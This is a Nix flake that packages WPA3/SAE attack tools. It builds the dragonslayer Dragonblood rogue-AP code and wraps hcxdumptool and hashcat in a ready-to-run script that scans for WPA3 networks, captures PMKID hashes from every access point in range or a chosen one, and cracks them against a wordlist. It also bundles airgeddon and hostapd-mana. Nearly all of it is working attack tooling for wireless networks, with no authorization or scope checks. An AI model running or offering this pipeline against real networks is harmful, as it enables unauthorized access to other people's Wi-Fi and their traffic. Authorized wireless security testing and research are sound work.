{
  description = "WPA3/SAE attack testing with dragonslayer, airgeddon and hcxdumptool";

  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
  };

  outputs = { self, nixpkgs }:
    let
      system = "x86_64-linux";
      pkgs = import nixpkgs { inherit system; };

      # Modified hostapd/wpa_supplicant with SAE Dragonblood attack code.
      # Server side performs the rogue-AP attack; client side triggers the SAE handshake.
      dragonslayer = pkgs.stdenv.mkDerivation {
        pname = "dragonslayer";
        version = "unstable";
        src = pkgs.fetchFromGitHub {
          owner = "vanhoefm";
          repo = "dragonslayer";
          rev = "e52180f5367e03cdc6681db81ae2e5fcfe50e4cf";
          hash = "sha256-JgKGFI9nrdQAR2HS9WNDPc7n+W0vZEhS+fJp3+kvx1U=";
        };
        nativeBuildInputs = with pkgs; [ pkg-config ];
        buildInputs = with pkgs; [ openssl libnl dbus ];
        buildPhase = ''
          cd hostapd
          cp defconfig .config
          echo "CONFIG_CTRL_IFACE_DBUS_NEW=n" >> .config
          echo "CONFIG_CTRL_IFACE_DBUS_INTRO=n" >> .config
          make -j$(nproc)
          cd ../wpa_supplicant
          cp defconfig .config
          echo "CONFIG_CTRL_IFACE_DBUS_NEW=n" >> .config
          echo "CONFIG_CTRL_IFACE_DBUS_INTRO=n" >> .config
          make -j$(nproc)
          cd ..
        '';
        installPhase = ''
          mkdir -p $out/bin $out/share/dragonslayer
          cp hostapd/hostapd          $out/bin/dragonslayer-hostapd
          cp wpa_supplicant/wpa_supplicant $out/bin/dragonslayer-supplicant
          cp dragonslayer/hostapd.conf     $out/share/dragonslayer/
          cp dragonslayer/client.conf      $out/share/dragonslayer/
          cp dragonslayer/hostapd.eap_user $out/share/dragonslayer/

          # Server wrapper: patches interface in config, then runs modified hostapd
          cat > $out/bin/dragonslayer-server <<EOF
#!/bin/sh
set -e
IFACE="\''${1:?Usage: dragonslayer-server <interface>}"
CONF="\$(mktemp /tmp/dragonslayer-hostapd.XXXXXX.conf)"
trap 'rm -f "\$CONF"' EXIT
sed "s/^interface=.*/interface=\$IFACE/" $out/share/dragonslayer/hostapd.conf > "\$CONF"
cp $out/share/dragonslayer/hostapd.eap_user "\$(dirname "\$CONF")/"
exec $out/bin/dragonslayer-hostapd "\$CONF"
EOF
          chmod +x $out/bin/dragonslayer-server

          # Client wrapper: patches interface in config, then runs modified wpa_supplicant
          cat > $out/bin/dragonslayer-client <<EOF
#!/bin/sh
set -e
IFACE="\''${1:?Usage: dragonslayer-client <interface>}"
exec $out/bin/dragonslayer-supplicant -D nl80211 -i "\$IFACE" \
  -c $out/share/dragonslayer/client.conf
EOF
          chmod +x $out/bin/dragonslayer-client
        '';
        doCheck = false;
      };

      wpa3Attack = pkgs.writeShellApplication {
        name = "wpa3-attack";
        runtimeInputs = with pkgs; [
          aircrack-ng
          coreutils
          gnugrep
          hashcat
          hcxdumptool
          hcxtools
          iproute2
          iw
        ];

        text = ''
          set -euo pipefail

          usage() {
            printf '%s\n' "Usage: wpa3-attack <interface> [bssid] [output-dir]" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "  interface  : wireless interface (must support monitor mode)" >&2
            printf '%s\n' "  bssid      : target a specific AP (default: all WPA3 APs)" >&2
            printf '%s\n' "  output-dir : directory for captures and results (default: current dir)" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Environment variables:" >&2
            printf '%s\n' "  WPA3_MODE=scan    detect WPA3 APs and report transition/SAE-only status" >&2
            printf '%s\n' "  WPA3_MODE=pmkid   capture PMKID via hcxdumptool (default)" >&2
            printf '%s\n' "  PMKID_TIMEOUT=150 seconds to run capture (default: 150)" >&2
            printf '%s\n' "  WORDLIST=<path>   wordlist to crack captured hashes immediately" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "For SAE Dragonblood attacks use: nix run .#dragonslayer" >&2
            printf '%s\n' "For interactive WPA3 menu use:   nix run .#airgeddon" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Example: WPA3_MODE=scan wpa3-attack wlan1" >&2
            printf '%s\n' "Example: wpa3-attack wlan1 AA:BB:CC:DD:EE:FF /tmp/wpa3" >&2
            exit 2
          }

          if [ "$#" -lt 1 ] || [ "$#" -gt 3 ]; then
            usage
          fi

          INTERFACE="$1"
          BSSID="''${2:-}"
          OUTPUT_DIR="''${3:-.}"
          WPA3_MODE="''${WPA3_MODE:-pmkid}"
          PMKID_TIMEOUT="''${PMKID_TIMEOUT:-150}"
          WORDLIST="''${WORDLIST:-}"

          if [ "$(id -u)" -ne 0 ]; then
            printf '%s\n' "This tool must be run as root." >&2
            exit 1
          fi

          if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
            printf '%s\n' "Interface does not exist: $INTERFACE" >&2
            exit 1
          fi

          if ! iw phy "$(iw dev "$INTERFACE" info | awk '/wiphy/{print "phy" $2}')" info \
               | grep -q '^\s*\* monitor'; then
            printf '%s\n' "Interface $INTERFACE does not support monitor mode." >&2
            exit 1
          fi

          case "$PMKID_TIMEOUT" in
            ""|*[!0-9]*)
              printf '%s\n' "PMKID_TIMEOUT must be a positive integer." >&2
              exit 2
              ;;
          esac

          if [ -n "$WORDLIST" ] && [ ! -f "$WORDLIST" ]; then
            printf '%s\n' "Wordlist not found: $WORDLIST" >&2
            exit 1
          fi

          if [ "$WPA3_MODE" = "scan" ]; then
            printf '%s\n' "Scanning for WPA3 APs on $INTERFACE (10 s)..."
            printf '%s\n' ""

            ip link set "$INTERFACE" up
            SCAN_RAW="$(iw dev "$INTERFACE" scan 2>/dev/null || true)"

            if [ -z "$SCAN_RAW" ]; then
              printf '%s\n' "No scan results. Ensure the interface is up and not in monitor mode."
              exit 0
            fi

            printf '%-20s  %-32s  %s\n' "BSSID" "SSID" "WPA3 MODE"
            printf '%s\n'  "--------------------------------------------------------------------"

            current_bssid=""
            current_ssid=""
            has_sae=0
            has_psk=0

            print_entry() {
              if [ -n "$current_bssid" ] && [ "$has_sae" -eq 1 ]; then
                if [ "$has_psk" -eq 1 ]; then
                  mode="Transition (WPA3+WPA2)"
                else
                  mode="SAE-only (WPA3)"
                fi
                printf '%-20s  %-32s  %s\n' "$current_bssid" "$current_ssid" "$mode"
              fi
            }

            while IFS= read -r line; do
              case "$line" in
                "BSS "*)
                  print_entry
                  current_bssid="$(printf '%s' "$line" | awk '{print $2}' | tr -d '(on')"
                  current_ssid=""
                  has_sae=0
                  has_psk=0
                  ;;
                *"SSID: "*)
                  current_ssid="$(printf '%s' "$line" | sed 's/.*SSID: //')"
                  ;;
                *"SAE"*)
                  has_sae=1
                  ;;
                *"PSK"*)
                  has_psk=1
                  ;;
              esac
            done <<EOF
$SCAN_RAW
EOF
            print_entry
            printf '%s\n' "--------------------------------------------------------------------"
            printf '%s\n' "Transition-mode APs also accept WPA2."
            exit 0
          fi

          if [ "$WPA3_MODE" = "pmkid" ]; then
            mkdir -p "$OUTPUT_DIR"
            TIMESTAMP="$(date +%Y%m%d-%H%M%S)"
            PCAP="''${OUTPUT_DIR}/wpa3-''${TIMESTAMP}.pcapng"
            PMKID_FILE="''${OUTPUT_DIR}/wpa3-''${TIMESTAMP}.pmkid"

            printf '%s\n' "WPA3 PMKID capture"
            printf '%s\n' "  Interface : $INTERFACE"
            printf '%s\n' "  Target    : ''${BSSID:-all WPA3 APs}"
            printf '%s\n' "  Timeout   : ''${PMKID_TIMEOUT}s"
            printf '%s\n' "  Output    : $PCAP"
            printf '%s\n' "Press Ctrl+C to stop early."

            HCXARGS="--enable_status=1 -o $PCAP"
            if [ -n "$BSSID" ]; then
              printf '%s\n' "$BSSID" > "''${OUTPUT_DIR}/filterlist.txt"
              HCXARGS="$HCXARGS --filterlist_ap=''${OUTPUT_DIR}/filterlist.txt --filtermode=2"
            fi

            # shellcheck disable=SC2086
            timeout "$PMKID_TIMEOUT" hcxdumptool -i "$INTERFACE" $HCXARGS || true

            if [ ! -f "$PCAP" ]; then
              printf '%s\n' "No capture file produced."
              exit 1
            fi

            hcxpcaptool -z "$PMKID_FILE" "$PCAP" 2>/dev/null || \
              hcxpcapngtool -z "$PMKID_FILE" "$PCAP" 2>/dev/null || true

            if [ -s "$PMKID_FILE" ]; then
              HASH_COUNT="$(wc -l < "$PMKID_FILE")"
              printf '%s\n' "Captured $HASH_COUNT hash(es) -> $PMKID_FILE"
              if [ -n "$WORDLIST" ]; then
                printf '%s\n' "Cracking with hashcat (mode 22000)..."
                hashcat -m 22000 "$PMKID_FILE" "$WORDLIST"
              else
                printf '%s\n' "To crack offline:"
                printf '%s\n' "  hashcat -m 22000 $PMKID_FILE /path/to/wordlist.txt"
              fi
            else
              printf '%s\n' "No PMKID/EAPOL hashes extracted. Raw capture saved to $PCAP"
            fi
            exit 0
          fi

          printf '%s\n' "Unknown WPA3_MODE: $WPA3_MODE. Use 'scan' or 'pmkid'." >&2
          exit 2
        '';
      };

      dragonslayerRun = pkgs.writeShellApplication {
        name = "dragonslayer-run";
        runtimeInputs = [ dragonslayer pkgs.iproute2 ];

        text = ''
          set -euo pipefail

          usage() {
            printf '%s\n' "Usage: dragonslayer-run server <ap-interface>" >&2
            printf '%s\n' "       dragonslayer-run client <sta-interface>" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "  server <ap-interface>  : rogue SAE AP that triggers timing side-channel" >&2
            printf '%s\n' "  client <sta-interface> : SAE client that associates with a target AP" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Both sides must run simultaneously on separate machines or network namespaces." >&2
            printf '%s\n' "The attack type is configured in the built-in hostapd.conf." >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Example (server): dragonslayer-run server wlan1" >&2
            printf '%s\n' "Example (client): dragonslayer-run client wlan2" >&2
            exit 2
          }

          if [ "$#" -ne 2 ]; then
            usage
          fi

          MODE="$1"
          INTERFACE="$2"

          if [ "$(id -u)" -ne 0 ]; then
            printf '%s\n' "This tool must be run as root." >&2
            exit 1
          fi

          if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
            printf '%s\n' "Interface does not exist: $INTERFACE" >&2
            exit 1
          fi

          case "$MODE" in
            server)
              printf '%s\n' "Dragonblood SAE server (rogue AP)"
              printf '%s\n' "  Interface : $INTERFACE"
              printf '%s\n' "Start the client side on another interface to trigger the attack."
              exec dragonslayer-server "$INTERFACE"
              ;;
            client)
              printf '%s\n' "Dragonblood SAE client"
              printf '%s\n' "  Interface : $INTERFACE"
              exec dragonslayer-client "$INTERFACE"
              ;;
            *)
              printf '%s\n' "Mode must be 'server' or 'client'." >&2
              exit 2
              ;;
          esac
        '';
      };

    in
    {
      packages.${system} = {
        inherit dragonslayer;
        wpa3-attack = wpa3Attack;
        dragonslayer-run = dragonslayerRun;
        airgeddon = pkgs.airgeddon;
        default = wpa3Attack;
      };

      apps.${system} = {
        default = {
          type = "app";
          program = "${wpa3Attack}/bin/wpa3-attack";
        };
        dragonslayer = {
          type = "app";
          program = "${dragonslayerRun}/bin/dragonslayer-run";
        };
        airgeddon = {
          type = "app";
          program = "${pkgs.airgeddon}/bin/airgeddon";
        };
      };

      devShells.${system}.default = pkgs.mkShell {
        packages = with pkgs; [
          aircrack-ng
          airgeddon
          hashcat
          hashcat-utils
          hcxdumptool
          hcxtools
          hostapd
          hostapd-mana
          iproute2
          iw
        ];
      };
    };
}
